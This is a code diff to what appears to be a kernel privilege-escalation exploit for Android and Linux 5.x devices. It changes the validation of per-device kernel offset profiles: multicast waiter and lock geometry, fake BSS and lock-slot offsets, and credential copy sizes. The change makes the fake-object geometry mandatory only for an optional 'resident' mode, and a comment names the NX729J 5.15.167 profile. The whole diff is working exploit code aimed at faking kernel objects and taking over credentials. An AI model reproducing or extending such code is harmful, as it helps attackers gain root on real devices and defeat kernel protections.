@@ -108,21 +108,30 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
     }
   }
   if (entry->kernel_major == 5) {
-    if (!entry->off_empty_zero_page || !entry->off_mcast_fake_bss ||
-        !entry->compact_waiter ||
-        !entry->mm_struct_sz ||
-        entry->mcast_waiter_off <= 0 ||
+    /* The normal 5.15 route only needs the measured waiter geometry present in
+     * upstream profiles. The fake BSS/lock-slot geometry belongs exclusively
+     * to the optional resident route and is absent from valid profiles such as
+     * the NX729J 5.15.167 profile. Do not reject the normal route because an
+     * opt-in experimental route has no device measurements. */
+    if (!entry->off_empty_zero_page || !entry->compact_waiter ||
+        !entry->mm_struct_sz || entry->mcast_waiter_off <= 0 ||
         !entry->mcast_buffer_size ||
         entry->mcast_waiter_off + entry->mcast_lock_offset + sizeof(uint64_t) >
             entry->mcast_buffer_size ||
         !entry->mcast_task_offset || !entry->mcast_lock_offset ||
-        !entry->mcast_fake_lock_offset || !entry->mcast_fake_task_offset ||
-        !entry->mcast_lock_slots_offset ||
-        !entry->mcast_lock_slot_count || !entry->mcast_lock_slot_stride ||
         entry->cred_copy_size < 0xa0 || !entry->cred_ref_count) {
       pr_error("5.x profile requires empty_zero_page, compact waiter, "
-               "credential references, an mm_struct stride, and complete "
+               "credential references, an mm_struct stride, and base "
                "multicast geometry\n");
+      return -1;
+    }
+    if (g_runtime_config.multicast_resident_enabled &&
+        (!entry->off_mcast_fake_bss || !entry->mcast_fake_lock_offset ||
+         !entry->mcast_fake_task_offset ||
+         !entry->mcast_lock_slots_offset ||
+         !entry->mcast_lock_slot_count || !entry->mcast_lock_slot_stride)) {
+      pr_error("resident 5.x mode requires measured fake BSS and lock-slot "
+               "geometry; disable GHOSTLOCK_5X_RESIDENT for this kernel\n");
       return -1;
     }
   }
